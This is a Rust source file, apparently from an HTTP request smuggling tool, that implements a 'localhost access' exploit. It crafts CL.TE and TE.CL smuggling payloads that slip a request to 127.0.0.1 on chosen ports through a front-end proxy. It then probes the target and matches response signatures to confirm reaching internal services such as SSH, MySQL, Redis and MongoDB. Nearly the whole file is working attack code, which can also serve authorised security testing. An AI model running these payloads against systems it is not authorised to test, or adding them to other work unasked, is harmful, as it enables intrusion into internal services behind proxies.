use crate::error::{Result, SmugglexError};
use crate::http::send_request;
use crate::model::CheckResult;
use colored::*;
use std::time::Duration;

// HTTP status codes for localhost access detection
const HTTP_FORBIDDEN: u16 = 403;
const HTTP_MISDIRECTED_REQUEST: u16 = 421;
const HTTP_BAD_GATEWAY: u16 = 502;
const HTTP_SERVICE_UNAVAILABLE: u16 = 503;
const HTTP_GATEWAY_TIMEOUT: u16 = 504;

/// Detected vulnerability information for exploitation
#[derive(Debug, Clone)]
pub struct VulnerabilityContext {
    pub vuln_type: String,
    pub payload: String,
    pub payload_index: usize,
}

/// Result of a localhost access attempt
#[derive(Debug)]
pub struct LocalhostAccessResult {
    pub port: u16,
    pub success: bool,
    pub reason: String,
    pub response_status: Option<String>,
    pub response_body: Option<String>,
}

/// Test localhost access using detected smuggling vulnerability
pub async fn test_localhost_access(
    host: &str,
    port: u16,
    path: &str,
    use_tls: bool,
    timeout: u64,
    verbose: bool,
    vuln_ctx: &VulnerabilityContext,
    localhost_ports: &[u16],
) -> Result<Vec<LocalhostAccessResult>> {
    let mut results = Vec::new();

    // Get baseline response for comparison
    let baseline_request = format!(
        "GET {} HTTP/1.1\r\nHost: {}\r\nConnection: close\r\n\r\n",
        path, host
    );
    let (baseline_response, baseline_duration) =
        send_request(host, port, &baseline_request, timeout, verbose, use_tls).await?;
    let baseline_status = baseline_response.lines().next().unwrap_or("").to_string();
    let baseline_body = extract_body(&baseline_response);

    if verbose {
        println!(
            "\n{} Baseline response: {} ({}ms)",
            "[*]".cyan(),
            baseline_status.bold(),
            baseline_duration.as_millis()
        );
    }

    // Test each localhost port
    for &localhost_port in localhost_ports {
        if verbose {
            println!(
                "\n{} Testing localhost access on port {}...",
                "[*]".cyan(),
                localhost_port.to_string().yellow()
            );
        }

        let result = test_single_port(
            host,
            port,
            path,
            use_tls,
            timeout,
            verbose,
            vuln_ctx,
            localhost_port,
            &baseline_status,
            &baseline_body,
            baseline_duration,
        )
        .await?;

        results.push(result);
    }

    Ok(results)
}

async fn test_single_port(
    host: &str,
    port: u16,
    path: &str,
    use_tls: bool,
    timeout: u64,
    verbose: bool,
    vuln_ctx: &VulnerabilityContext,
    localhost_port: u16,
    baseline_status: &str,
    baseline_body: &str,
    baseline_duration: Duration,
) -> Result<LocalhostAccessResult> {
    // Generate localhost access payload based on vulnerability type
    let smuggling_payload =
        generate_localhost_payload(vuln_ctx, path, host, localhost_port, verbose);

    // Send the smuggling payload
    match send_request(host, port, &smuggling_payload, timeout, verbose, use_tls).await {
        Ok((_smuggling_response, _)) => {
            if verbose {
                println!("  {} Smuggling payload sent", "[+]".green());
            }

            // Send probe request to observe backend response
            tokio::time::sleep(Duration::from_millis(100)).await;
            let probe_request = format!(
                "GET {} HTTP/1.1\r\nHost: {}\r\nConnection: close\r\n\r\n",
                path, host
            );

            match send_request(host, port, &probe_request, timeout, verbose, use_tls).await {
                Ok((probe_response, probe_duration)) => {
                    let probe_status = probe_response.lines().next().unwrap_or("").to_string();
                    let probe_body = extract_body(&probe_response);

                    // Analyze response to detect localhost access
                    analyze_localhost_response(
                        localhost_port,
                        &probe_status,
                        &probe_body,
                        probe_duration,
                        baseline_status,
                        baseline_body,
                        baseline_duration,
                        verbose,
                    )
                }
                Err(e) => {
                    // Connection errors might indicate successful smuggling
                    if matches!(e, SmugglexError::Timeout(_)) {
                        Ok(LocalhostAccessResult {
                            port: localhost_port,
                            success: true,
                            reason: "Connection timeout after smuggling (possible localhost access)"
                                .to_string(),
                            response_status: None,
                            response_body: None,
                        })
                    } else {
                        Ok(LocalhostAccessResult {
                            port: localhost_port,
                            success: false,
                            reason: format!("Probe request failed: {}", e),
                            response_status: None,
                            response_body: None,
                        })
                    }
                }
            }
        }
        Err(e) => Ok(LocalhostAccessResult {
            port: localhost_port,
            success: false,
            reason: format!("Smuggling request failed: {}", e),
            response_status: None,
            response_body: None,
        }),
    }
}

fn generate_localhost_payload(
    vuln_ctx: &VulnerabilityContext,
    path: &str,
    host: &str,
    localhost_port: u16,
    verbose: bool,
) -> String {
    let vuln_type_lower = vuln_ctx.vuln_type.to_lowercase();

    let payload = if vuln_type_lower.contains("cl-te") || vuln_type_lower.contains("clte") {
        // CL.TE: Front-end uses Content-Length, back-end uses Transfer-Encoding
        // We smuggle a request to localhost in the chunked body
        generate_clte_localhost_payload(path, host, localhost_port)
    } else if vuln_type_lower.contains("te-cl") || vuln_type_lower.contains("tecl") {
        // TE.CL: Front-end uses Transfer-Encoding, back-end uses Content-Length
        // We smuggle a request to localhost after the chunked body
        generate_tecl_localhost_payload(path, host, localhost_port)
    } else {
        // Fallback: try CL.TE approach
        if verbose {
            println!(
                "  {} Unknown vulnerability type '{}', using CL.TE approach",
                "[!]".yellow(),
                vuln_ctx.vuln_type
            );
        }
        generate_clte_localhost_payload(path, host, localhost_port)
    };

    if verbose {
        println!("  {} Generated localhost payload for port {}", "[*]".cyan(), localhost_port);
    }

    payload
}

fn generate_clte_localhost_payload(path: &str, host: &str, localhost_port: u16) -> String {
    // CL.TE payload structure:
    // Front-end reads Content-Length bytes
    // Back-end reads chunked encoding and processes smuggled request
    let smuggled_request = format!(
        "GET / HTTP/1.1\r\n\
         Host: 127.0.0.1:{}\r\n\
         Connection: close\r\n\
         \r\n",
        localhost_port
    );

    format!(
        "POST {} HTTP/1.1\r\n\
         Host: {}\r\n\
         Connection: keep-alive\r\n\
         Content-Length: {}\r\n\
         Transfer-Encoding: chunked\r\n\
         \r\n\
         0\r\n\
         \r\n\
         {}",
        path,
        host,
        smuggled_request.len() + 6, // 0\r\n\r\n + smuggled_request length
        smuggled_request
    )
}

fn generate_tecl_localhost_payload(path: &str, host: &str, localhost_port: u16) -> String {
    // TE.CL payload structure:
    // Front-end reads Transfer-Encoding (chunked)
    // Back-end reads Content-Length and leaves remainder in buffer
    let smuggled_request = format!(
        "GET / HTTP/1.1\r\n\
         Host: 127.0.0.1:{}\r\n\
         Connection: close\r\n\
         \r\n",
        localhost_port
    );

    let chunk_data = "X";
    let chunk_size = format!("{:x}", chunk_data.len());

    format!(
        "POST {} HTTP/1.1\r\n\
         Host: {}\r\n\
         Connection: keep-alive\r\n\
         Content-Length: {}\r\n\
         Transfer-Encoding: chunked\r\n\
         \r\n\
         {}\r\n\
         {}\r\n\
         0\r\n\
         \r\n\
         {}",
        path,
        host,
        chunk_size.len() + chunk_data.len() + 4, // chunk_size + \r\n + data + \r\n
        chunk_size,
        chunk_data,
        smuggled_request
    )
}

fn extract_body(response: &str) -> String {
    // Extract body from HTTP response
    if let Some(body_start) = response.find("\r\n\r\n") {
        response[body_start + 4..].to_string()
    } else {
        String::new()
    }
}

fn analyze_localhost_response(
    localhost_port: u16,
    probe_status: &str,
    probe_body: &str,
    probe_duration: Duration,
    baseline_status: &str,
    baseline_body: &str,
    baseline_duration: Duration,
    verbose: bool,
) -> Result<LocalhostAccessResult> {
    let mut success_indicators = Vec::new();

    // Check for status code changes
    let probe_code = extract_status_code(probe_status);
    let baseline_code = extract_status_code(baseline_status);

    if probe_code != baseline_code {
        success_indicators.push(format!(
            "Status code changed from {} to {}",
            baseline_code.unwrap_or(0),
            probe_code.unwrap_or(0)
        ));
    }

    // Check for specific error codes indicating internal access attempts
    if let Some(code) = probe_code
        && matches!(
            code,
            HTTP_BAD_GATEWAY
                | HTTP_SERVICE_UNAVAILABLE
                | HTTP_GATEWAY_TIMEOUT
                | HTTP_FORBIDDEN
                | HTTP_MISDIRECTED_REQUEST
        )
    {
        success_indicators.push(format!(
            "Received error code {} (possible internal routing)",
            code
        ));
    }

    // Check for localhost service signatures in response
    let localhost_signatures = get_localhost_signatures(localhost_port);
    for signature in &localhost_signatures {
        if probe_body.contains(signature) && !baseline_body.contains(signature) {
            success_indicators.push(format!("Found signature '{}' in response", signature));
        }
    }

    // Check for connection/routing errors in body
    let error_keywords = [
        "Connection refused",
        "Connection reset",
        "No route to host",
        "Host is unreachable",
        "Bad Gateway",
        "Service Unavailable",
        "Gateway Timeout",
        "Unable to connect",
        "Connection timeout",
        "upstream",
        "backend",
        "127.0.0.1",
        "localhost",
    ];

    for keyword in &error_keywords {
        if probe_body.contains(keyword) && !baseline_body.contains(keyword) {
            success_indicators
                .push(format!("Found error keyword '{}' in response body", keyword));
        }
    }

    // Check for significant timing differences
    let timing_diff = probe_duration.as_millis() as i128 - baseline_duration.as_millis() as i128;
    if timing_diff.abs() > 1000 {
        // More than 1 second difference
        success_indicators.push(format!("Significant timing difference: {}ms", timing_diff));
    }

    let success = !success_indicators.is_empty();
    let reason = if success {
        success_indicators.join("; ")
    } else {
        "No indicators of localhost access detected".to_string()
    };

    if verbose {
        if success {
            println!("  {} Indicators found: {}", "[+]".green(), reason);
        } else {
            println!("  {} No indicators found", "[-]".red());
        }
    }

    Ok(LocalhostAccessResult {
        port: localhost_port,
        success,
        reason,
        response_status: Some(probe_status.to_string()),
        response_body: Some(probe_body.to_string()),
    })
}

fn extract_status_code(status_line: &str) -> Option<u16> {
    let parts: Vec<&str> = status_line.split_whitespace().collect();
    if parts.len() >= 2 && (parts[0].starts_with("HTTP/1.") || parts[0].starts_with("HTTP/2")) {
        parts[1].parse::<u16>().ok()
    } else {
        None
    }
}

fn get_localhost_signatures(port: u16) -> Vec<String> {
    match port {
        22 => vec![
            "SSH-2.0".to_string(),
            "SSH-1.".to_string(),
            "OpenSSH".to_string(),
        ],
        80 | 8080 => vec![
            "Apache".to_string(),
            "nginx".to_string(),
            "Server:".to_string(),
        ],
        443 => vec![
            "SSL handshake".to_string(),
            "TLS alert".to_string(),
            "certificate".to_string(),
        ],
        3306 => vec!["MySQL".to_string(), "MariaDB".to_string()],
        5432 => vec!["PostgreSQL".to_string()],
        6379 => vec!["Redis".to_string()],
        27017 => vec!["MongoDB".to_string()],
        _ => vec![],
    }
}

/// Print localhost access results in a formatted way
pub fn print_localhost_results(results: &[LocalhostAccessResult], target_url: &str) {
    let successful: Vec<_> = results.iter().filter(|r| r.success).collect();

    println!("\n{}", "=== Localhost Access Exploit Results ===".bold());
    println!("{} {}", "Target:".bold(), target_url);
    println!(
        "{} {}/{}",
        "Success Rate:".bold(),
        successful.len(),
        results.len()
    );
    println!();

    if successful.is_empty() {
        println!(
            "{} No successful localhost access detected on any tested port",
            "[-]".red().bold()
        );
    } else {
        for result in &successful {
            println!(
                "{} {} on port {}",
                "[+]".green().bold(),
                "Localhost Access Successful".green().bold(),
                result.port.to_string().yellow().bold()
            );
            println!("  {} {}", "Reason:".bold(), result.reason);
            if let Some(ref status) = result.response_status {
                println!("  {} {}", "Response Status:".bold(), status);
            }
            println!();
        }
    }

    // Show failed attempts if verbose or all failed
    if successful.len() < results.len() {
        println!("{}", "Failed Attempts:".bold());
        for result in results.iter().filter(|r| !r.success) {
            println!(
                "{} Port {} - {}",
                "[-]".red(),
                result.port,
                result.reason.dimmed()
            );
        }
    }
}

/// Extract vulnerability context from detected vulnerabilities
pub fn extract_vulnerability_context(results: &[CheckResult]) -> Option<VulnerabilityContext> {
    // Find first vulnerable result
    results
        .iter()
        .find(|r| r.vulnerable)
        .and_then(|r| {
            r.payload.as_ref().map(|payload| VulnerabilityContext {
                vuln_type: r.check_type.clone(),
                payload: payload.clone(),
                payload_index: r.payload_index.unwrap_or(0),
            })
        })
}
